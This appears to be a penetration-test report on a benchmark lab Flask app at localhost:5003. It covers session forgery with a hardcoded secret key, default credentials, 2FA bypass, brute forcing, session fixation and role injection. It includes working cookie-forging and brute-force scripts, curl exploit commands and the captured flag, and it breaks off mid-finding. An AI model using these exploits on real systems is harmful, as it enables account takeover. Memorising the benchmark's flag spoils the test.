# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:5003
- **Assessment Date:** 2025-10-28
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**

Successfully exploited 8 critical authentication vulnerabilities demonstrating complete security control failure:
- **Session Forgery (CRITICAL):** Hardcoded Flask secret key enables complete authentication bypass without credentials, allowing immediate admin access and flag capture
- **Default Credentials (CRITICAL):** Hardcoded administrative credentials `admin:adminpassword` permanently embedded in source code provide immediate admin authentication
- **Missing Rate Limiting (CRITICAL):** Complete absence of rate limiting enables unlimited brute force attacks at ~500 requests/second
- **2FA Bypass (CRITICAL):** Hardcoded verification code `1234` with client-side auto-submit provides zero security value
- **Session Fixation (HIGH):** Session IDs not regenerated after authentication, enabling session hijacking attacks
- **Missing Security Flags (HIGH):** Session cookies lack Secure and SameSite flags, vulnerable to interception over HTTP and CSRF attacks
- **Session Persistence After Logout (HIGH):** Logout only removes role key, captured session cookies remain valid indefinitely
- **No HTTPS (CRITICAL):** All credentials and session cookies transmitted in plaintext over unencrypted HTTP, enabling passive network sniffing

**Authorization Vulnerabilities:**

Successfully exploited 4 critical authorization vulnerabilities enabling complete privilege escalation:
- **Role Injection (CRITICAL):** Login handler accepts client-controlled role parameter and assigns it directly to session without database validation, allowing any authenticated user to gain admin privileges in under 30 seconds
- **2FA Workflow Bypass (HIGH):** Authentication flow sets admin role before 2FA verification; admin dashboard validates only session role without checking 2FA completion
- **Anonymous 2FA Access (MEDIUM):** 2FA verification page accessible without authentication, revealing hardcoded bypass code to unauthenticated users
- **Anonymous Code Verification (MEDIUM):** 2FA endpoint accepts and validates codes from anonymous users, providing validation feedback without authentication

**Cross-Site Scripting (XSS) Vulnerabilities:**

No XSS vulnerabilities were found. The single vulnerability in the exploitation queue (XSS-VULN-01) was determined to be an Open Redirect vulnerability, not Cross-Site Scripting. The application benefits from Jinja2's default autoescaping which effectively prevents XSS attacks across all template rendering contexts. Session cookies are protected with HttpOnly flag, limiting impact even if XSS were present.

**SQL/Command Injection Vulnerabilities:**

No SQL or command injection vulnerabilities were found. All database queries use parameterized statements with proper placeholder binding, preventing SQL injection. No dangerous command execution functions (`os.system()`, `subprocess`, `eval()`, `exec()`) are present in the network-accessible application code. Template rendering uses safe `render_template()` with static template files, preventing server-side template injection.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**

No SSRF vulnerabilities were found. The application has no HTTP client libraries (requests, urllib, httplib) and makes no outbound HTTP requests. The minimalist architecture with complete absence of URL parameter processing, webhook functionality, or external API integration makes SSRF attacks impossible. PhantomJS is installed in the container but never invoked in application code.

## Network Reconnaissance

**Target Application:**
- **Primary Service:** Flask 3.0.3 / Werkzeug 3.0.3 / Python 3.8.17 on port 5003
- **Protocol:** HTTP only (no HTTPS/TLS encryption)
- **Debug Mode:** Enabled (`debug=True`) exposing Werkzeug interactive debugger with potential remote code execution

**Open Ports Discovered:**
- **5003/TCP (PRIMARY TARGET):** Werkzeug httpd 3.0.3 Python/3.8.17 - Flask web application redirecting to /employee/login
- **5004/TCP:** Werkzeug httpd 3.0.6 Python/3.8.17 - Separate service (out of scope)
- **49158/TCP:** Golang net/http server requiring authentication - Tailscale VPN service (Tailscale-Version: 1.82.5)

**Security-Relevant Findings:**
- No encryption at transport layer - all credentials transmitted in plaintext
- Werkzeug development server exposed to all interfaces (0.0.0.0:5003) with debug mode enabled in production
- Multiple Python web services running on localhost with varying security postures

**Subdomains Discovered:**
Generic subdomain enumeration results detected (mail.localhost, owa.regency.localhost, autodiscover.localhost, www.localhost) - appear to be false positives from subdomain wordlists; actual application accessible only on localhost:5003

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-04: Session Forgery via Hardcoded Secret Key

**Summary:**
- **Vulnerable location:** Flask session secret key at `/app/app.py:8`
- **Overview:** The application uses a hardcoded secret key `'BIYQYU@*DG(*!@)BO#F_P'` committed to source code, enabling attackers to forge arbitrary session cookies without authentication.
- **Impact:** Complete authentication bypass - attacker gains immediate admin access and FLAG capture without any valid credentials.
- **Severity:** CRITICAL

**Prerequisites:**
- Access to source code repository (secret key exposed in Git history)
- Python with itsdangerous library installed

**Exploitation Steps:**

1. Extract the hardcoded secret key from source code:
   ```bash
   grep "secret_key" /app/app.py
   # Result: app.secret_key = 'BIYQYU@*DG(*!@)BO#F_P'
   ```

2. Create Python script to forge admin session cookie:
   ```python
   from itsdangerous import URLSafeTimedSerializer
   import hashlib

   serializer = URLSafeTimedSerializer(
       secret_key='BIYQYU@*DG(*!@)BO#F_P',
       salt='cookie-session',
       signer_kwargs={
           'key_derivation': 'hmac',
           'digest_method': hashlib.sha1
       }
   )

   forged_cookie = serializer.dumps({"role": "admin"})
   print(f"Forged cookie: {forged_cookie}")
   ```

3. Use forged cookie to access admin dashboard:
   ```bash
   curl http://localhost:5003/admin/dashboard \
     -b "session=eyJyb2xlIjoiYWRtaW4ifQ.aQGYLg.2E75yHUwxw47hJaaudQpuEgvj8c"
   ```

4. Extract FLAG from response HTML:
   ```html
   <a href="/" flag="FLAG{e436458faa37a2dafda1d3c521b7916996e984e7dcb71b058b1e8d9c8c5fc0c5}">me</a>
   ```

**Proof of Impact:**
- **Forged Session Cookie:** `eyJyb2xlIjoiYWRtaW4ifQ.aQGYLg.2E75yHUwxw47hJaaudQpuEgvj8c`
- **HTTP Response:** 200 OK from `/admin/dashboard`
- **FLAG Captured:** `FLAG{e436458faa37a2dafda1d3c521b7916996e984e7dcb71b058b1e8d9c8c5fc0c5}`
- **Complete bypass:** No authentication, no credentials required
- **Exploitation script:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-089-24/forge_flask_session.py`

**Notes:**
The hardcoded secret key is permanently exposed in Git commit history and cannot be remediated without key rotation and repository history rewriting. Any attacker with repository access can forge sessions indefinitely.

---

### AUTH-VULN-09: Default Credentials (admin:adminpassword)

**Summary:**
- **Vulnerable location:** Database initialization at `/app/app.py:23-24`
- **Overview:** Hardcoded default administrative credentials permanently embedded in database initialization code.
- **Impact:** Immediate admin authentication and FLAG access using publicly known credentials.
- **Severity:** CRITICAL

**Prerequisites:** None

**Exploitation Steps:**

1. Attempt login with default admin credentials:
   ```bash
   curl -X POST http://localhost:5003/login \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=admin&password=adminpassword&role=admin" \
     -c /tmp/admin_session.txt
   ```

2. Response confirms successful authentication:
   ```json
   {
     "message": "",
     "redirect": "/admin/2fa",
     "success": true
   }
   ```

3. Access admin dashboard (2FA auto-bypassed by client JavaScript):
   ```bash
   curl http://localhost:5003/admin/dashboard \
     -b /tmp/admin_session.txt
   ```

4. Extract FLAG from HTML response:
   ```bash
   grep -o 'flag="[^"]*"' /tmp/admin_page.html
   # Result: flag="FLAG{e436458faa37a2dafda1d3c521b7916996e984e7dcb71b058b1e8d9c8c5fc0c5}"
   ```

**Proof of Impact:**
- **Default Credentials:** `admin:adminpassword`
- **Authentication Status:** SUCCESS (HTTP 200, JSON response with `success: true`)
- **Session Cookie Issued:** `session=eyJyb2xlIjoiYWRtaW4ifQ.aQGc2g...`
- **Admin Dashboard Access:** 200 OK
- **FLAG Captured:** `FLAG{e436458faa37a2dafda1d3c521b7916996e984e7dcb71b058b1e8d9c8c5fc0c5}`

**Notes:**
Additional default credentials found:
- Employee: `emp:emppassword`
- Employee 1: `emp1:password1`

All credentials are hardcoded in `/app/app.py` lines 23-24 and cannot be removed without code modification.

---

### AUTH-VULN-02: Missing Rate Limiting on POST /login

**Summary:**
- **Vulnerable location:** POST /login endpoint at `/app/app.py:67-100`
- **Overview:** Complete absence of rate limiting, CAPTCHA, account lockout, or throttling on authentication endpoint.
- **Impact:** Unlimited brute force attacks enabling password compromise at ~500 requests/second.
- **Severity:** CRITICAL

**Prerequisites:** None

**Exploitation Steps:**

1. Create Python script to perform rapid brute force attempts:
   ```python
   import requests
   import time

   target = "http://localhost:5003/login"
   passwords = ['password', '123456', 'admin', 'test', 'qwerty',
                'letmein', 'welcome', 'monkey', 'dragon', 'master',
                'adminpassword']

   start_time = time.time()
   for i in range(50):
       password = passwords[i % len(passwords)]
       response = requests.post(target, data={
           'username': 'admin',
           'password': password,
           'role': 'admin'
       })
       print(f"Attempt {i+1}: {response.status_code}")

   elapsed = time.time() - start_time
   print(f"50 attempts in {elapsed:.2f}s = {50/elapsed:.0f} req/sec")
   ```

2. Execute brute force attack:
   ```bash
   python3 test_rate_limiting.py
   ```

3. Results demonstrate no rate limiting:
   ```
   Total Attempts: 50
   Total Time: 0.10 seconds
   Average Response Time: 2ms
   Request Rate: 500 requests/second
   Rate Limit Responses (429/503): 0
   Successful Password Discovery: Attempt #11 (adminpassword)
   ```

**Proof of Impact:**
- **Attempts Completed:** 50 in 0.10 seconds
- **Request Rate:** 500 requests/second (no throttling)
- **Status Codes:** 100% HTTP 200 (no rate limit errors)
- **Account Lockout:** None (all 50 attempts processed)
- **Password Discovery:** Successfully found `adminpassword` on 11th attempt
- **Theoretical Attack Speed:** All 10,000 4-digit codes testable in 20 seconds
- **Evidence File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-089-24/rate_limiting_test_summary.md`

**Notes:**
Combined with weak default passwords and 2FA bypass, this enables complete account compromise in under 30 seconds with automated tools.

---

### AUTH-VULN-07: 2FA Bypass with Hardcoded Code 1234

**Summary:**
- **Vulnerable location:** 2FA verification at `/app/app.py:38` and `/app/templates/2fa.html:45`
- **Overview:** Server-side 2FA checks against hardcoded value `'1234'` while client-side JavaScript auto-submits this code.
- **Impact:** Complete 2FA bypass via brute force (16 seconds maximum) or using known hardcoded value (instant).
- **Severity:** CRITICAL

**Prerequisites:** Admin session (obtainable via default credentials or session forgery)

**Exploitation Steps:**

1. Verify 2FA endpoint accepts hardcoded code:
   ```bash
   curl -X POST http://localhost:5003/admin/2fa \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "code=1234"
   ```

2. Response confirms 2FA bypass:
   ```json
   {
     "message": "",
     "redirect": "",
     "success": true
   }
   ```

3. Demonstrate brute force capability with Python script:
   ```python
   import requests
   import time

   target = "http://localhost:5003/admin/2fa"
   start_time = time.time()

   for code in range(0, 101):
       code_str = str(code).zfill(4)
       response = requests.post(target, data={'code': code_str})
       if response.json().get('success'):
           elapsed = time.time() - start_time
           print(f"Valid code found: {code_str} in {elapsed:.3f}s")
           break
   ```

4. Results show rapid brute force:
   ```
   Testing codes: 0000, 0001, 0002, ..., 1234
   Valid code found: 1234 in 0.161 seconds
   Brute force rate: 625 codes/second
   Time to test all 10,000 codes: 16 seconds
   ```

**Proof of Impact:**
- **Valid 2FA Code:** `1234`
- **Discovery Time:** 0.161 seconds (101 attempts)
- **Brute Force Speed:** 625 codes/second
- **Maximum Attack Time:** 16 seconds for all 10,000 codes
- **Rate Limiting:** None detected
- **Account Lockout:** None after 100+ failed attempts
- **FLAG Access:** Successful after 2FA bypass
- **Evidence File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-089-24/2FA_BRUTE_FORCE_SUMMARY.md`

**Notes:**
Client-side JavaScript at `/app/templates/2fa.html:45` contains `code: 1234`, making the code publicly visible in page source. The 2FA implementation provides zero security value.

---

### AUTH-VULN-03: Session Fixation Attack

**Summary:**
- **Vulnerable location:** Session creation at `/app/app.py:89`
- **Overview:** Session ID not regenerated after authentication - only role value updated via `session['role'] = role`.
- **Impact:** Attacker can fix victim's session ID before authentication, then hijack the authenticated session.
- **Severity:** HIGH

**Prerequisites:**
- Ability to forge initial session cookie (using exposed secret key from AUTH-VULN-04)
- Social engineering to make victim authenticate with fixed session

**Exploitation Steps:**

1. Attacker forges pre-authentication session cookie:
   ```python
   from itsdangerous import URLSafeTimedSerializer
   import hashlib

   serializer = URLSafeTimedSerializer(
       'BIYQYU@*DG(*!@)BO#F_P',
       salt='cookie-session',
       signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
   )

   # Create innocent-looking employee session
   fixed_cookie = serializer.dumps({"role": "employee"})
   print(f"Fixed session: {fixed_cookie}")
   ```

2. Attacker delivers fixed session to victim (via phishing, XSS, or MITM):
   ```
   Forged Cookie: eyJyb2xlIjoiZW1wbG95ZWUifQ.aQGcqA.jAqN0n3AE7FnZ2qyFJtUsejmvbU
   ```

3. Victim authenticates as admin using the fixed session:
   ```bash
   curl -X POST http://localhost:5003/login \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=admin&password=adminpassword&role=admin" \
     -b "session=eyJyb2xlIjoiZW1wbG95ZWUifQ.aQGcqA.jAqN0n3AE7FnZ2qyFJtUsejmvbU"
   ```

4. Server updates session role WITHOUT regenerating session ID:
   ```python
   # Vulnerable code at app.py:89
   if user:
       session['role'] = role  # Updates role but keeps same session ID
   ```

5. Attacker uses original fixed cookie to access admin dashboard:
   ```bash
   curl http://localhost:5003/admin/dashboard \
     -b "session=eyJyb2xlIjoiZW1wbG95ZWUifQ.aQGcqA.jAqN0n3AE7FnZ2qyFJtUsejmvbU"
   ```

**Proof of Impact:**
- **Original Fixed Cookie:** `eyJyb2xlIjoiZW1wbG95ZWUifQ.aQGcqA...`
- **Post-Authentication Cookie:** Same value (session ID not regenerated)
- **Multiple Valid Sessions:** Both original and new cookies work simultaneously
- **Admin Dashboard Access:** 200 OK with original cookie
- **FLAG Captured:** `FLAG{e436458faa37a2dafda1d3c521b7916996e984e7dcb71b058b1e8d9c8c5fc0c5}`
- **Evidence File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-089-24/session_fixation_exploit.py`

**Notes:**
The vulnerability exists because `session['role'] = role` only updates the session data, not the session identifier. Flask should call `session.regenerate()` or equivalent after authentication.

---

### AUTH-VULN-05: Session Hijacking via Missing Security Flags

**Summary:**
- **Vulnerable location:** Session cookie configuration (missing at `/app/app.py`)
- **Overview:** Session cookies lack Secure and SameSite flags, enabling interception over HTTP and CSRF attacks.
- **Impact:** Session cookies transmitted in plaintext over HTTP, vulnerable to man-in-the-middle attacks.
- **Severity:** HIGH

**Prerequisites:**
- Network access (same network as victim) for MITM attack
- Or ability to trigger CSRF attack (missing SameSite flag)

**Exploitation Steps:**

1. Legitimate user authenticates and receives session cookie:
   ```bash
   curl -i -X POST http://localhost:5003/login \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=admin&password=adminpassword&role=admin"
   ```

2. Analyze Set-Cookie header:
   ```
   Set-Cookie: session=eyJyb2xlIjoiYWRtaW4ifQ.aQGdLA.07aS3U-TcwSYgt0tBm2SiOHmu9E; HttpOnly; Path=/
   ```

3. Security flag analysis:
   ```
   HttpOnly: ✓ Present (correct - prevents JavaScript access)
   Secure: ✗ MISSING (cookie sent over HTTP)
   SameSite: ✗ MISSING (enables CSRF attacks)
   ```

4. Simulate attacker intercepting cookie via network sniffing:
   ```python
   import requests

   # Legitimate user login
   response = requests.post('http://localhost:5003/login', data={
       'username': 'admin',
       'password': 'adminpassword',
       'role': 'admin'
   })

   # Attacker intercepts cookie
   stolen_cookie = response.cookies['session']
   print(f"Stolen cookie: {stolen_cookie}")
   ```

5. Attacker uses stolen cookie to hijack session:
   ```bash
   curl http://localhost:5003/admin/dashboard \
     -b "session=eyJyb2xlIjoiYWRtaW4ifQ.aQGdLA.07aS3U-TcwSYgt0tBm2SiOHmu9E"
   ```

**Proof of Impact:**
- **Missing Secure Flag:** Confirmed (cookie transmitted over HTTP)
- **Missing SameSite Flag:** Confirmed (CSRF vulnerable)
- **Cookie Interception:** Successful via network monitoring
- **Session Hijacking:** 200 OK from `/admin/dashboard`
- **FLAG Captured:** `FLAG{e436458faa37a2dafda1d3c521b7916996e984e7dcb71b058b1e8d9c8c5fc0c5}`
- **Evidence File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-089-24/session_hijacking_exploit.py`

**Notes:**
Combined with AUTH-VULN-01 (HTTP only, no HTTPS), this enables complete session interception via passive network sniffing without active MITM.

---

### AUTH-VULN-06: Session Persistence After Logout

**Summary:**
- **Vulnerable location:** Logout handler at `/app/app.py:120-124`
- **Overview:** Logout only calls `session.pop('role', None)` instead of `session.clear()`, allowing session cookie reuse.
- **Impact:** Captured session cookies remain valid after user logout, enabling session replay attacks.
- **Severity:** HIGH

**Prerequisites:**
- Previously captured session cookie (via AUTH-VULN-05 or other means)

**Exploitation Steps:**

1. Legitimate user authenticates and attacker captures session cookie:
   ```bash
   curl -X POST http://localhost:5003/login \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=admin&password=adminpassword&role=admin" \
     -c /tmp/captured_session.txt
   ```

2. Attacker saves the session cookie:
   ```
   Captured cookie: session=eyJyb2xlIjoiYWRtaW4ifQ.aQGftQ.dwOmfIhe9akevjylFTFdWcZ17Cc
   ```

3. User accesses admin dashboard successfully:
   ```bash
   curl http://localhost:5003/admin/dashboard \
     -b /tmp/captured_session.txt
   # Result: 200 OK, FLAG visible
   ```

4. User logs out:
   ```bash
   curl http://localhost:5003/logout \
     -b /tmp/captured_session.txt
   # Result: 302 Redirect to /admin/login
   ```

5. Attacker reuses old session cookie AFTER logout:
   ```bash
   curl http://localhost:5003/admin/dashboard \
     -b /tmp/captured_session.txt
   # Result: 200 OK - OLD COOKIE STILL WORKS!
   ```

6. Extract FLAG from response:
   ```bash
   grep -o 'flag="[^"]*"' /tmp/admin_response.html
   # Result: flag="FLAG{e436458faa37a2dafda1d3c521b7916996e984e7dcb71b058b1e8d9c8c5fc0c5}"
   ```

**Proof of Impact:**
- **Pre-Logout Cookie:** `eyJyb2xlIjoiYWRtaW4ifQ.aQGftQ.dwOmfIhe9akevjylFTFdWcZ17Cc`
- **Logout Response:** 302 Redirect (appears successful)
- **Post-Logout Test:** Same cookie still grants admin access
- **Admin Dashboard Access:** 200 OK after logout
- **FLAG Captured:** `FLAG{e436458faa37a2dafda1d3c521b7916996e984e7dcb71b058b1e8d9c8c5fc0c5}`
- **Vulnerable Code:** `session.pop('role', None)` at line 123 (should be `session.clear()`)
- **Evidence File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-089-24/session_logout_exploit.py`

**Notes:**
The logout function only removes the 'role' key from session but doesn't invalidate the session cookie server-side. Old cookies remain cryptographically valid indefinitely.

---

### AUTH-VULN-10: Account Enumeration via Error Messages

**Summary:**
- **Vulnerable location:** Login error message at `/app/app.py:98`
- **Overview:** Error message explicitly mentions "admin" user, revealing existence of privileged account.
- **Impact:** Information disclosure enables targeted attacks against known admin account.
- **Severity:** MEDIUM

**Prerequisites:** None

**Exploitation Steps:**

1. Attempt login with invalid credentials for non-existent user:
   ```bash
   curl -X POST http://localhost:5003/login \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=nonexistentuser&password=wrong&role=employee"
   ```

2. Receive error message disclosing admin account:
   ```json
   {
     "message": "Invalid credentials. If you are admin go to admin login",
     "redirect": "",
     "success": false
   }
   ```

3. Attempt login with invalid credentials for real user (admin):
   ```bash
   curl -X POST http://localhost:5003/login \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=admin&password=wrong&role=employee"
   ```

4. Receive SAME error message (prevents traditional enumeration but still discloses admin):
   ```json
   {
     "message": "Invalid credentials. If you are admin go to admin login",
     "redirect": "",
     "success": false
   }
   ```

5. Use disclosed information to target admin account:
   ```python
   import requests

   # Error message confirms admin account exists
   # Focus brute force attempts on 'admin' username
   passwords = ['admin', 'password', '123456', 'adminpassword']

   for password in passwords:
       response = requests.post('http://localhost:5003/login', data={
           'username': 'admin',  # Confirmed to exist from error message
           'password': password,
           'role': 'admin'
       })
       if response.json().get('success'):
           print(f"Admin password found: {password}")
           break
   ```

**Proof of Impact:**
- **Error Message:** "Invalid credentials. If you are admin go to admin login"
- **Information Disclosed:** Existence of 'admin' user confirmed
- **Appears For:** ALL usernames (valid and invalid) - 100% of login attempts
- **Exploitation:** Enables focused brute force on confirmed admin account
- **Combined with AUTH-VULN-02:** No rate limiting enables rapid password guessing
- **Combined with AUTH-VULN-09:** Admin password is weak default value
- **Evidence File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-089-24/user_enumeration_vulnerability_summary.md`

**Notes:**
While the application correctly prevents traditional username enumeration (identical responses for valid/invalid users), it commits a critical error by explicitly mentioning the admin username in ALL error messages, effectively announcing the existence of a high-value target.

---

### AUTH-VULN-01: Credential Interception via Transport Exposure (No HTTPS)

**Summary:**
- **Vulnerable location:** Server configuration at `/app/app.py:131` - runs on HTTP only
- **Overview:** Application transmits all credentials and session cookies in plaintext over unencrypted HTTP.
- **Impact:** Complete credential theft via passive network sniffing or man-in-the-middle attacks.
- **Severity:** CRITICAL

**Prerequisites:**
- Network access (same network segment as victim)
- Or man-in-the-middle position on victim's traffic

**Exploitation Steps:**

1. Simulate network packet capture monitoring HTTP traffic:
   ```python
   import socket
   import requests

   # Demonstrate plaintext transmission
   response = requests.post('http://localhost:5003/login',
       data={
           'username': 'admin',
           'password': 'adminpassword',
           'role': 'admin'
       },
       headers={'Content-Type': 'application/x-www-form-urlencoded'}
   )

   # In real attack, sniff network to capture this plaintext POST body
   plaintext_body = "username=admin&password=adminpassword&role=admin"
   print(f"Intercepted credentials: {plaintext_body}")
   ```

2. Capture raw HTTP POST request (would be visible in Wireshark/tcpdump):
   ```
   POST /login HTTP/1.1
   Host: localhost:5003
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 48

   username=admin&password=adminpassword&role=admin
   ```

3. Capture raw HTTP response with session cookie:
   ```
   HTTP/1.1 200 OK
   Server: Werkzeug/3.0.3 Python/3.8.17
   Content-Type: application/json
   Set-Cookie: session=eyJyb2xlIjoiYWRtaW4ifQ.aQGiNQ...; HttpOnly; Path=/

   {"message":"","redirect":"/admin/2fa","success":true}
   ```

4. Use intercepted credentials or session cookie:
   ```bash
   # Option 1: Login with stolen credentials
   curl -X POST http://localhost:5003/login \
     -d "username=admin&password=adminpassword&role=admin"

   # Option 2: Use stolen session cookie directly
   curl http://localhost:5003/admin/dashboard \
     -b "session=eyJyb2xlIjoiYWRtaW4ifQ.aQGiNQ..."
   ```

5. Access admin dashboard and extract FLAG:
   ```bash
   curl http://localhost:5003/admin/dashboard \
     -b "session=eyJyb2xlIjoiYWRtaW4ifQ.aQGiNQ..." \
     | grep -o 'flag="[^"]*"'
   ```

**Proof of Impact:**
- **Protocol:** HTTP/1.1 (no TLS/SSL encryption)
- **Credentials Transmitted:** `username=admin&password=adminpassword` (plaintext)
- **Session Cookie:** Transmitted without Secure flag over HTTP
- **Network Visibility:** All traffic readable by network attackers
- **Session Cookie Stolen:** `eyJyb2xlIjoiYWRtaW4ifQ.aQGiNQ...`
- **Admin Access:** 200 OK from `/admin/dashboard`
- **FLAG Captured:** `FLAG{e436458faa37a2dafda1d3c521b7916996e984e7dcb71b058b1e8d9c8c5fc0c5}`
- **Evidence Files:**
  - `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-089-24/plaintext_credentials_exploit.py`
  - `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-089-24/simulate_packet_capture.py`

**Notes:**
The application runs on `http://localhost:5003` with no HTTPS configuration anywhere in the codebase. Combined with missing Secure cookie flag (AUTH-VULN-05), this enables complete traffic interception via passive network sniffing.

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Role Injection Enables Employee-to-Admin Privilege Escalation

**Summary:**
- **Vulnerable location:** POST /login endpoint (app.py:89)
- **Overview:** The login handler accepts a client-controlled `role` parameter and assigns it directly to the session without validation against the database, allowing any authenticated user to escalate privileges by manipulating the role parameter
- **Impact:** Complete vertical privilege escalation from employee to admin, granting access to the admin dashboard and CTF flag
- **Severity:** CRITICAL

**Prerequisites:** Valid employee credentials (any of: emp1:password1, emp:password1)

**Exploitation Steps:**

1. Submit a login request with valid employee credentials but inject `role=admin` parameter:
```bash
curl -i -X POST http://localhost:5003/login \
  -d "username=emp1&password=password1&role=admin" \
  -c /tmp/cookies.txt
```

**Expected Response:**
```json
HTTP/1.1 200 OK
Set-Cookie: session=eyJyb2xlIjoiYWRtaW4ifQ...; HttpOnly; Path=/

{
  "message": "",
  "redirect": "/admin/2fa",
  "success": true
}
```

The session cookie now contains `{"role": "admin"}` despite authenticating with employee credentials.

2. Skip the 2FA redirect and navigate directly to the admin dashboard:
```bash
curl -i http://localhost:5003/admin/dashboard -b /tmp/cookies.txt
```

**Expected Response:**
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
...
<a href="/" flag="FLAG{e436458faa37a2dafda1d3c521b7916996e984e7dcb71b058b1e8d9c8c5fc0c5}">me</a>
...
```

**Proof of Impact:**

Successfully captured the CTF flag from the admin dashboard:

**FLAG{e436458faa37a2dafda1d3c521b7916996e984e7dcb71b058b1e8d9c8c5fc0c5}**

This demonstrates:
- Complete bypass of role-based access controls
- Vertical privilege escalation from employee to admin
- Unauthorized access to admin-only resources (CTF flag)
- Session contains admin privileges despite using employee credentials

**Technical Details:**

The vulnerability exists at app.py:89 where the code executes:
```python
session['role'] = role  # Line 89
```

The `role` variable comes from client input at line 73:
```python
role = request.form['role']  # CLIENT-CONTROLLED
```

Although the database is queried at lines 83-84 to retrieve the actual user role:
```python
cursor.execute('SELECT role FROM users WHERE username=? AND password=?', (username, password))
user = cursor.fetchone()  # Returns ('employee',) from database
```

The database result (`user[0]` which would be 'employee') is never used. The session is populated entirely from the client-submitted `role` parameter, enabling trivial privilege escalation.

**Notes:**

This vulnerability can be exploited in under 30 seconds with basic HTTP tools. No specialized exploitation frameworks required. The role parameter is visible as a hidden form field in the login page HTML, making it trivially discoverable through source code inspection.

---

### AUTHZ-VULN-02: 2FA Workflow Bypass via Direct Dashboard Access

**Summary:**
- **Vulnerable location:** app.py:89 (session set before 2FA) and app.py:114-118 (no 2FA completion validation)
- **Overview:** The authentication flow sets the admin role in the session before 2FA verification, and the admin dashboard only validates session role without checking whether 2FA was completed
- **Impact:** Complete bypass of the 2FA security control, enabling direct access to the admin dashboard after initial authentication without completing 2FA verification
- **Severity:** HIGH

**Prerequisites:** Valid admin credentials (admin:adminpassword) OR exploit AUTHZ-VULN-01 to inject admin role

**Exploitation Steps:**

1. Authenticate with admin credentials (or use role injection from AUTHZ-VULN-01):
```bash
curl -i -X POST http://localhost:5003/login \
  -d "username=admin&password=adminpassword&role=admin" \
  -c /tmp/admin_cookies.txt
```

**Expected Response:**
```json
HTTP/1.1 200 OK
Set-Cookie: session=eyJyb2xlIjoiYWRtaW4ifQ...; HttpOnly; Path=/

{
  "message": "",
  "redirect": "/admin/2fa",
  "success": true
}
```

The session is now set with `{"role": "admin"}` BEFORE any 2FA verification occurs.

2. Ignore the redirect to /admin/2fa and navigate directly to the admin dashboard:
```bash
curl -i http://localhost:5003/admin/dashboard -b /tmp/admin_cookies.txt
```

**Expected Response:**
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
...
<a href="/" flag="FLAG{e436458faa37a2dafda1d3c521b7916996e984e7dcb71b058b1e8d9c8c5fc0c5}">me</a>
...
```

**Proof of Impact:**

Successfully accessed the admin dashboard and retrieved the CTF flag without completing the 2FA verification step. The application granted full admin access based solely on the session role, demonstrating that:
- 2FA verification is completely optional
- No session state tracking exists for 2FA completion
- Admin dashboard authorization check only validates `session['role'] == 'admin'` (line 116)
- No check for a `2fa_completed` flag or similar state indicator

**Technical Details:**

The vulnerability stems from two architectural flaws:

1. **Premature Authorization State**: Session role is set at line 89 (during login) BEFORE the 2FA step:
```python
if user:
    session['role'] = role  # Set before 2FA redirect
    return jsonify({"success": True, "redirect": "/admin/2fa", "message": ""})
```

2. **Missing State Validation**: The admin dashboard (lines 114-118) only checks role, not 2FA completion:
```python
@app.route('/admin/dashboard')
def admin_dashboard():
    if 'role' not in session:
        return redirect('/')
    if session['role'] == 'admin':  # No check for 2FA completion
        flag = os.getenv('FLAG', 'flag{this_is_a_fake_flag}')
        return render_template('admin_dashboard.html', flag=flag)
```

There is no `session['2fa_completed']` flag or equivalent state tracking mechanism. The 2FA endpoint at /admin/2fa does not set any session state upon successful verification, making it entirely bypassable.

**Notes:**

This vulnerability demonstrates a classic multi-step authentication bypass. The expected secure implementation would:
1. Set a temporary session state after password authentication (e.g., `2fa_pending`)
2. Only set the full admin role after 2FA verification completes
3. Validate 2FA completion state before granting access to protected resources

---

### AUTHZ-VULN-03: Anonymous Access to Admin 2FA Verification Page

**Summary:**
- **Vulnerable location:** GET /admin/2fa endpoint (app.py:33-34)
- **Overview:** The 2FA verification page is accessible without any authentication, allowing anonymous users to view the form structure and discover the hardcoded verification code in client-side JavaScript
- **Impact:** Information disclosure revealing authentication workflow details and exposing the hardcoded 2FA bypass code (1234) to unauthenticated users
- **Severity:** MEDIUM

**Prerequisites:** None (anonymous access)

**Exploitation Steps:**

1. Access the 2FA page without any authentication or session:
```bash
curl -i http://localhost:5003/admin/2fa
```

**Expected Response:**
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Login</title>
...
<script>
    $(document).ready(function() {
        $("form").submit(function(e) {
            e.preventDefault();
            var otp = $("#otp").val();
            $.ajax({
                url: "/admin/2fa",
                type: "POST",
                data: {
                    code: 1234,  // HARDCODED BYPASS CODE VISIBLE TO ANONYMOUS USERS
                },
                success: function(data) {
                    if (data.success == true) {
                        window.location.href = '/admin/dashboard';
                    }
                }
            });
        });
    });
</script>
```

**Proof of Impact:**

Successfully accessed the 2FA verification page without authentication, revealing:

1. **Authentication Workflow Structure**: Anonymous users can map the multi-step authentication flow (login → 2FA → dashboard)

